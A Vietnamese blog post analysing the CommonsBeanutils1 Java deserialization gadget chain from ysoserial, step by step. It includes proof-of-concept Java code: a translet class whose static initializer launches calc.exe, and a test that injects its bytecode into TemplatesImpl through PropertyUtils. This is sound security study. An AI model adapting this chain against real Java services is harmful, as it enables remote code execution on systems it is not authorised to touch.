---
title: "[Java Deserialization] CommonsBeanutils1 exploit chain analysis"
date: 2022-01-19T18:17:00+07:00
draft: false
categories: [
    "Offensive Security",
]
tags: [
    "Java","Code"
]
---
Các lỗ hổng liên quan tới deserialization trên Java đã trở thành một vấn đề bảo mật nóng trong những năm gần đây. Quá trình deserialize không an toàn có thể dẫn đến các lỗ hổng nghiêm trọng như thực thi mã từ xa. Ysoserial là một dự án được tạo bởi frohoff, một người phát hiện ra lỗ hổng deserialization trên Java. Bài viết này sẽ phân tích về chain CommonsBeanutils1

Apache Commons Beanutils là một dự án khác thuộc bộ công cụ Apache Commons cung cấp một số phương thức thao tác trên các đối tượng lớp Java thông thường (còn được gọi là JavaBeans).

### Gadget chain
```
ObjectInputStream.readObject()
    PriorityQueue.readObject()
        PriorityQueue.heapify()
            PriorityQueue.siftDown()
                siftDownUsingComparator()
                    BeanComparator.compare()
                        TemplatesImpl.getOutputProperties()
                            TemplatesImpl.newTransformer()
                                TemplatesImpl.getTransletInstance()
                                    TemplatesImpl.defineTransletClasses()
                                        TemplatesImpl.TransletClassLoader.defineClass()
                                            Pwner*(Javassist-generated).<static init>
                                                Runtime.exec()
```
### Phân tích
Ví dụ, đây là lớp JavaBean đơn giản nhất

![](https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/1.jpg)

Commons-beanutils cung cấp một phương thức tĩnh PropertyUtils.getProperty cho phép người dùng gọi trực tiếp phương thức getter của bất kỳ JavaBean nào, chẳng hạn như:

```
PropertyUtils.getProperty (Object bean, String name)
```

![](https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/2.jpg)

Lúc này, commons-beanutils sẽ tự động tìm phương thức getter của thuộc tính name, tức là getName, rồi gọi nó để lấy giá trị trả về. Bằng cách này, người dùng có thể dễ dàng gọi getter của bất kỳ đối tượng nào.

Trong phương thức so sánh của lớp BeanComparator, có một lệnh gọi đến hàm PropertyUtils.getProperty, được thực hiện như sau:

![](https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/3.jpg)

Phương thức này truyền vào 2 đối tượng. Nếu this.property là null thì so sánh hai objects trực tiếp với nhau, ngược lại this.property khác null, sẽ sử dụng PropertyUtils.getProperty để lấy giá trị property của hai đối tượng và so sánh chúng với nhau. Như đã nói ở trên, PropertyUtils.getProperty sẽ tự động gọi phương thức getter của JavaBean, đây là key để thực thi code tuỳ ý. 

Vậy có bất kì phương thức getter nào có thể thực thi mã tuỳ ý không?

**TemplatesImpl chain**

```
TemplatesImpl#getOutputProperties ->
TemplatesImpl#newTransformer() ->
TemplatesImpl#getTransletInstance() -> 
TemplatesImpl#defineTransletClasses()-> 
TransletClassLoader#defineClass()
```

Chain thức này đã được tìm thấy trước đó. PropertyUtils.getProperty(o1, property) : Khi o1 được truyền vào là một TemplatesImpl object và property có giá trị là outputProperties, phương thức getter sẽ tự động gọi để thực thi phương thức TemplatesImpl#getOutputProperties(). Trong nội bộ TemplatesImpl#getOutputProperties() nó lại gọi đến newTransformer()

![](https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/4.jpg)

Mà TemplatesImpl#newTransformer() thường được sử dụng để thực thi bytecodes độc hại:

```
TemplatesImpl#newTransformer() ->
```
![](https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/5.jpg)

TemplatesImpl#getTransletInstance() -> 

![](https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/6.jpg)

TemplatesImpl#defineTransletClasses()-> 

![](https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/7.jpg)

TransletClassLoader#defineClass()

Xây dựng TemplatesImpl

```
TemplatesImpl templates = new TemplatesImpl();
setFieldValue(templates,"_name", "Pwnr");
setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
setFieldValue(templates,"_bytecodes",new byte[][]{malicious_bytes});
PropertyUtils.getProperty(templates,"outputProperties");
```

![](https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/8.jpg)

Và sau đó truyền đối tượng TemplatesImpl vừa tạo vào BeanComparator

```
BeanComparator beanComparator = new BeanComparator("outputProperties");
```

**PriorityQueue**

ReadObject trong PriorityQueue sẽ gọi hàm heapify để sắp xếp các phần tử, sau đó kích hoạt phương thức comparator.compare tạo nên một chuỗi hoàn hảo. Chắc vẫn còn cách khác để trigger được comparator.compare nhưng trong gadget chain này tác giả đã sử dụng cách thức này. Càng phân tích càng thấy hâm mộ những con người đi trước sao có thể tìm được như vậy.

```
final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
```

![](https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/9.jpg)

![](https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/10.jpg)

![](https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/11.jpg)

![](https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/12.jpg)

Chain hoàn chỉnh:

![](https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/13.jpg)

Hoàn hảo!

Code thao khảo:

**RunCmd.class**
```
package com.summer.cb1;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;


public class RunCmd extends AbstractTranslet{
    static {
        try {
            Runtime.getRuntime().exec(new String[]{"cmd","/c","calc.exe"});
        } catch (Exception e){
            e.printStackTrace();
        }
    }

    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}

```

**TempletesTest class**
```
package com.summer.cb1;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassPool;
import org.apache.commons.beanutils.PropertyUtils;
import org.junit.Test;

import java.lang.reflect.Field;

public class TempletesTest {

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static byte[] classToBytes() throws Exception{
        byte[] bytes = ClassPool.getDefault().get(RunCmd.class.getName()).toBytecode();
        return bytes;
    }

    @Test
    public void test() throws Exception{
        TemplatesImpl templates = new TemplatesImpl();
        setFieldValue(templates,"_name", "Pwnr");
        setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        setFieldValue(templates,"_bytecodes",new byte[][]{classToBytes()});
        PropertyUtils.getProperty(templates,"outputProperties");
    }

    
}

```

![](https://raw.githubusercontent.com/tranquac/Blog_Image/master/cb1/14.jpg)

Học được: 

- Kĩ năng nghiên cứu, phân tích vấn đề
- Học được nhiều điều về java và phân tích gadget chain trong java deserialization.

Ngày đầu ngồi đọc không hiểu gì. Ngày 2 bắt đầu vào phân tích thấy rất hay và vỡ ra nhiều điều. Mình sẽ phân tích các gadget chain khác hoặc một CVE nào đó về java deserialization trong thời gian tới.

Tham khảo (Để hiểu được không biết tôi đã đọc bao nhiêu bài viết của các pháp sư Trung Hoa nữa!)

Cảm ơn bạn đã đọc tới đây!


